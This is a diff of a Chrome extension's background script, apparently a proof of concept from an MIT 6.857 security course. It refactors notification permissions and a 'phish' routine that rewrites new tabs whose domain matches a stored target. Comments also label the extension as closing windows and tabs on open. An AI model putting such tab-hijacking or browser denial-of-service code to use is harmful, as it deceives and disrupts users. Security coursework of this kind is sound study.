@@ -4,6 +4,11 @@ if (localStorage.getItem('closeBool') == undefined) localStorage.setItem('closeB
 if (localStorage.getItem('rerouteBool') == undefined) localStorage.setItem('rerouteBool', false);
 if (localStorage.getItem('powerBool') == undefined) localStorage.setItem('powerBool', false);
 
+/**
+ * (notifications)
+ * Add persistent notifications through requesting permissions, 
+ * so no "special permission" is requested if not necessary.
+ */
 var createNotification = function() {
     chrome.notifications.create('chroak', {
         type: 'basic',
@@ -13,19 +18,29 @@ var createNotification = function() {
         isClickable: false
      }, function(notificationId) {});
 }
-
-if (JSON.parse(localStorage.getItem('notificationBool'))) {
-  createNotification();
-}
-chrome.notifications.onClosed.addListener(function(notifId, byUser){
+var notificationsListener = function(notifId, byUser) {
   if (JSON.parse(localStorage.getItem('notificationBool'))) {
+    createNotification();
+  }
+}
+var addNotificationListener = function() {
+  createNotification();
+  chrome.notifications.onClosed.addListener(notificationsListener);
+}
+var removeNotificationListener = function() {
+  chrome.notifications.onClosed.removeListener(notificationsListener);
+}
+chrome.permissions.contains({permissions:['notifications']}, function(contains) {
+  if (contains) {
     createNotification();
   }
 });
 
+
+
 chrome.commands.onCommand.addListener(function(command) {
-        console.log('Command:', command);
-      });
+  console.log('Command:', command);
+});
 
 /*
  * Dos Chrome -- Close windows and tabs as soon as they open.
@@ -53,6 +68,8 @@ chrome.windows.onCreated.addListener(function(event) {
 
 chrome.tabs.onCreated.addListener(function(event) {
   console.log('opened a new tab');
+  console.log(event);
+
 
   if (event.url) { // execute phishing attack
     console.log('caputured new tab url');
@@ -79,7 +96,7 @@ function phish(input_url, tab_id) {
     url = split[split.length-2] + '.' + split[split.length-1];
   }
   console.log('shortened url: ' + url);
-  if (url == document.getElementById('phish-site').value) {
+  if (url == localStorage.getItem('phish-site')) {
     chrome.tabs.update(tab_id, {url: 'http://courses.csail.mit.edu/6.857/2016/'});
   }
 }
